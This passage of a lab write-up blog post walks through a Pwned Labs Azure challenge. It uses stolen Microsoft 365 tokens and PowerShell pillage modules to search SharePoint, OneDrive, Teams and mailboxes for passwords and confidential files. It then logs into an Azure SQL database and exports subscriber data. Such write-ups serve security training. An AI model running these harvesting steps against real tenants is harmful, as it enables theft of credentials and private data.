+</span></span></code></pre></div><p>As shown above we have two file retrieved the <strong><code>passwords.xlsx</code></strong> file and the <strong><code>Finance Logins.docx</code></strong> both hosted on the SharePoint site. We also downloaded the files by selecting <strong><code>All</code></strong> when prompted for a response.</p>
+<p>Checking each of this files we have hardcoded embedded credentials in which these logins can provide access to sensitive systems and data, and may also allow server access through abusable functionalities like file uploads or application vulnerabilities.</p>
+<p><em><strong><code>Finance Logins.docx ::</code></strong></em></p>
+<p><img loading="lazy" src="https://i.imgur.com/LO9VDmz.png"></p>
+<p><em><strong><code>passwords.xlsx ::</code></strong></em></p>
+<p><img loading="lazy" src="https://i.imgur.com/glYJsKS.png"></p>
+<p>We can also search for other sensitive files using the search term &lsquo;bonus&rsquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Invoke-SearchSharePointAndOneDrive</span> <span class="n">-Tokens</span> <span class="nv">$tokens</span> <span class="n">-SearchTerm</span> <span class="s1">&#39;bonus&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">provided</span> <span class="n">access</span> <span class="n">tokens</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Found</span> <span class="mf">1</span> <span class="n">matches</span> <span class="k">for</span> <span class="n">search</span> <span class="n">term</span> <span class="n">bonus</span>
+</span></span><span class="line"><span class="cl"><span class="n">Result</span> <span class="p">[</span><span class="mf">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Name</span><span class="err">:</span> <span class="n">Bonuses</span> <span class="p">-</span> <span class="n">Confidential</span><span class="p">.</span><span class="py">xlsx</span>
+</span></span><span class="line"><span class="cl"><span class="n">Location</span><span class="err">:</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="nb">iancloudpwned-my</span><span class="p">.</span><span class="py">sharepoint</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">personal</span><span class="p">/</span><span class="n">sam_olsson_megabigtech_com</span><span class="p">/</span><span class="n">Documents</span><span class="p">/</span><span class="n">Bonuses</span> <span class="p">-</span> <span class="n">Confidential</span><span class="p">.</span><span class="py">xlsx</span>
+</span></span><span class="line"><span class="cl"><span class="n">Created</span> <span class="n">Date</span><span class="err">:</span> <span class="mf">11</span><span class="p">/</span><span class="mf">05</span><span class="p">/</span><span class="mf">2023</span> <span class="mf">21</span><span class="err">:</span><span class="mf">50</span><span class="err">:</span><span class="mf">58</span>
+</span></span><span class="line"><span class="cl"><span class="n">Last</span> <span class="n">Modified</span> <span class="n">Date</span><span class="err">:</span> <span class="mf">11</span><span class="p">/</span><span class="mf">05</span><span class="p">/</span><span class="mf">2023</span> <span class="mf">21</span><span class="err">:</span><span class="mf">50</span><span class="err">:</span><span class="mf">58</span>
+</span></span><span class="line"><span class="cl"><span class="n">Size</span><span class="err">:</span> <span class="mf">17.50</span> <span class="n">KB</span>
+</span></span><span class="line"><span class="cl"><span class="n">File</span> <span class="n">Preview</span><span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">DriveID</span> <span class="p">&amp;</span> <span class="n">Item</span> <span class="n">ID</span><span class="err">:</span> <span class="n">b</span><span class="p">!</span><span class="nb">qFVO5o9Td0OqTdtkAzLcOeLC9xqzoSxNgtanvmZOWlEk66ey-hWeTL_LW84ry4xf</span><span class="p">\</span><span class="err">:</span><span class="n">01LMH7HCXMTDF5WDES3ZF3IDWGRV2P4OXB</span>
+</span></span><span class="line"><span class="cl"><span class="p">================================================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="k">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">download</span> <span class="n">any</span> <span class="n">of</span> <span class="n">these</span> <span class="n">files</span><span class="p">?</span> <span class="p">(</span><span class="n">Yes</span><span class="p">/</span><span class="n">No</span><span class="p">/</span><span class="n">All</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Yes</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Enter</span> <span class="n">the</span> <span class="n">result</span> <span class="n">number</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">of</span> <span class="n">the</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">that</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">download</span><span class="p">.</span> <span class="n">Ex</span><span class="p">.</span> <span class="s2">&#34;0,10,24&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Now</span> <span class="n">downloading</span> <span class="n">Bonuses</span> <span class="p">-</span> <span class="n">Confidential</span><span class="p">.</span><span class="py">xlsx</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="k">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">download</span> <span class="n">any</span> <span class="n">more</span> <span class="n">files</span><span class="p">?</span> <span class="p">(</span><span class="n">Yes</span><span class="p">/</span><span class="n">No</span><span class="p">/</span><span class="n">All</span><span class="p">)</span>                                                                
+</span></span><span class="line"><span class="cl"><span class="n">No</span>                                                                                                                      
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Quitting</span><span class="p">...</span>
+</span></span></code></pre></div><p>As shown above a <code>Bonuses - Confidential.xlsx</code> was downloaded and trying to open this file we get the below message</p>
+<p><img loading="lazy" src="https://i.imgur.com/FTu2Nrr.png"></p>
+<p>After trying all passwords we have gotten so far in which did not work, i decided to enumerate other Microsoft 365 services, starting with the <code>Invoke-SearchTeams</code> pillage module which searches for all Teams messages in all channels that are readable by the current user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-SearchTeams</span> <span class="n">-Tokens</span> <span class="nv">$tokens</span> <span class="n">-SearchTerm</span> <span class="n">password</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/jBmsrQv.png"></p>
+<p>As shown above i was able to get some passwords which worked and had access to the encrypted document.</p>
+<p><img loading="lazy" src="https://i.imgur.com/UcyjNfz.png"></p>
+<p>It is also worth searching the mailbox of our current user using the <code>Invoke-SearchMailbox</code> in this context the user &lsquo;`Clara.Miller&rsquo;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-SearchMailbox</span> <span class="n">-Tokens</span> <span class="nv">$tokens</span> <span class="n">-SearchTerm</span> <span class="s2">&#34;password&#34;</span> <span class="n">-MessageCount</span> <span class="mf">40</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/sLVt8gt.png"></p>
+<p>As shown above we got an image preview showing a username and password of the <code>mbt-finance.database.windows.net</code> server including DB named <code>Finance</code>. According to <a href="https://pwnedlabs.io/">@pwnedlabs</a> article the use of powershell and VS Code where implemented, But in this article, would show you how to use <code>dbeaver</code>, A community DB management tool.</p>
+<p>First of all download the tool using the apt package manager as shown below</p>
+<pre tabindex="0"><code>sudo apt install dbeaver
+</code></pre><p>Then open up <code>dbeaver</code> and if you don&rsquo;t get the pop-up as shown in the below image use the hotkey <strong><code>shift+ctrl+N</code></strong> to open up the window and use the search term <strong><code>Azure</code></strong> then select &ldquo;Azure SQL Server&rdquo;</p>
+<p><img loading="lazy" src="https://i.imgur.com/xnDRx23.png"></p>
+<p>Enter the connection details in the next window including the DB name, Credentials and Host name, Then click <strong><code>Finish</code></strong> once done.</p>
+<p><img loading="lazy" src="https://i.imgur.com/ynueZ4K.png"></p>
+<p>If there was a successful host connection, you should see a drop down of different databases as shown below</p>
+<p><img loading="lazy" src="https://i.imgur.com/RMz7ky2.png"></p>
+<p>We are mostly interested in the sequence; <strong><code>Database</code></strong> &gt; <strong><code>Finance</code></strong> &gt; <strong><code>Schemas</code></strong> &gt; <strong><code>dbo</code></strong> &gt; <strong><code>Tables</code></strong> &gt; <strong><code>Subscriber</code></strong> &gt; <strong><code>Columns</code></strong>. Where sensitive credentials are stored.</p>
+<p><img loading="lazy" src="https://i.imgur.com/ULhJCkd.png"></p>
+<p>The best thing to do is to export the data in the <strong><code>Subscribers</code></strong> table so go ahead and right click on this table and select &ldquo;<strong><code>Export Data</code></strong>&rdquo;.</p>
+<p><img loading="lazy" src="https://i.imgur.com/iA3nj41.png"></p>
+<p>You should have a data transfer page, Go ahead and select which format you would like the data to be exported as, I love to use the JSON format, so i will go ahead and chose that.</p>
+<p><img loading="lazy" src="https://i.imgur.com/lpJjDsz.png"></p>
+<p>Then select <strong><code>Next</code></strong> with the default values until you get to the final page and hit <strong><code>Proceed</code></strong> to finally export the data to your user home folder.</p>
+<p><img loading="lazy" src="https://i.imgur.com/4KGAj3k.png"></p>
+<p>You should get the prompt, completed,  when the exportation is done and you can now view the exported data as shown below. Go ahead and submit the flag to complete the lab.</p>
+<p><img loading="lazy" src="https://i.imgur.com/YtPKL6l.png"></p>
+<p>Be cool ⋆˚🐾˖°</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/azure/">Azure</a></li>
+      <li><a href="http://localhost:1313/tags/red-teaming/">Red Teaming</a></li>
+      <li><a href="http://localhost:1313/tags/entra-id/">Entra-ID</a></li>
+      <li><a href="http://localhost:1313/tags/powershell/">Powershell</a></li>
+      <li><a href="http://localhost:1313/tags/ms-sql/">MS SQL</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/hacking/unmask_privileged_access_in_azure/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Unmask Privileged Access In Azure</span>
+  </a>
+  <a class="next" href="http://localhost:1313/hacking/unlock_access_with_azure_key_vault/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Unlock Access with Azure Key Vault</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">SecFortress</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
